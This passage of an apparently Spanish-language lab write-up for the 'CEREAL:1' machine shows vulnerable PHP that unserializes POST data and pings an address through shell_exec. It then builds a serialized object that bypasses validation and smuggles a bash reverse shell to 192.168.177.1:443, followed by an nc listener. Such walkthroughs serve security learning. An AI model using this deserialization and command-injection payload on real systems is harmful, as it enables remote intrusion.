</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">validate</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isValid</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filter_var</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ipAddress</span>, <span style="color:#a6e22e">FILTER_VALIDATE_IP</span>))
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isValid</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ping</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ping</span>()
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isValid</span>) {
</span></span><span style="display:flex;"><span>			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;ping -c 3 </span><span style="color:#e6db74">$this-&gt;ipAddress</span><span style="color:#e6db74">&#34;</span>);	
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;obj&#39;</span>])) {
</span></span><span style="display:flex;"><span>	$pingTest <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>(<span style="color:#a6e22e">urldecode</span>($_POST[<span style="color:#e6db74">&#39;obj&#39;</span>]));
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>	$pingTest <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">pingTest</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$pingTest<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">validate</span>();
</span></span></code></pre></div><p>Podemos ver que el código de [[PHP]] aplica una validación en la ip, para asegurarse que es realmente una ip, para posteriormente poner la variable isValid en True, para ser capaces de saltarnos la validación tendríamos que hacer que el objeto que enviemos ponga esta variable en True.</p>
<p>Para esto nos podemos crear un archivo en [[PHP]] en nuestra maquina que nos cree el objeto según estos parámetros.</p>
<p>Aquí vamos a poner el valor isValid en true y en la ipAdress ponemos un punto y coma y el one-liner típico de una reverse shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">pingTest</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $ipAddress <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;; bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.177.1/443 0&gt;&amp;1&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $isValid <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> $output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">pingtest</span>));
</span></span></code></pre></div><p>Si ejecutamos este script nos dará el objeto URLencodeado</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php serialize.php 2&gt;/dev/null; echo
</span></span></code></pre></div><p>Ahora en burpsuite sustituimos el anterior objeto por este</p>
<p><img src="/vlnh/CEREAL:1/images/5.png" alt="CEREAL"></p>
<p>Nos ponemos e escucha por el puerto 443</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
</span></span></code></pre></div><p>Y enviamos la petición, esto nos dará una consola interactiva</p>

    </section>
</article>
<br>
<br>
<section class="read-more">
    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/writeups/2022/07/pika-twoo/" title="link to Pika Twoo">Pika Twoo</a></h2>
        <p class="excerpt"></p>
        <div class="post-list__meta">
            <time datetime=" 2022-07-19 07:28:17 &#43;0800" class="post-list__meta--date date">2022-07-19</time>
             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/say-hi">Say Hi</a>   • <a href="https://rug4lo.github.io/tags/hugo">Hugo</a>  </span> 
        </div>
    </div>
    


    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/posts/2021/07/hello-world-vno/" title="link to Hello World Vno">Hello World Vno</a></h2>
        <p class="excerpt"></p>
        <div class="post-list__meta">
            <time datetime=" 2022-07-19 07:28:17 &#43;0800" class="post-list__meta--date date">2021-07-19</time>
             
            <span class="post-list__meta--tags tags"> 
                  • <a href="https://rug4lo.github.io/tags/say-hi">Say Hi</a>   • <a href="https://rug4lo.github.io/tags/vno">Vno</a>  
            </span>
            
        </div>
    </div>
    
 </section>
  
<br>

        <section class="footer">
    <footer>
        <span class="footer__copyright"> © 2024 - Rug4lo </span>
    </footer>
</section>

    </div>
  </div>

  <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script><script>
    (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'your_ga_id', 'your_host');
    ga('send', 'pageview');
</script>

  
  <script>
    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
      
      var mensaje = document.createElement('div');
      mensaje.innerHTML = 'Esta página no se visualiza bien en dispositivos móviles. Por favor, visita desde un ordenador.';
      document.body.appendChild(mensaje);
    }
  </script>

</body>

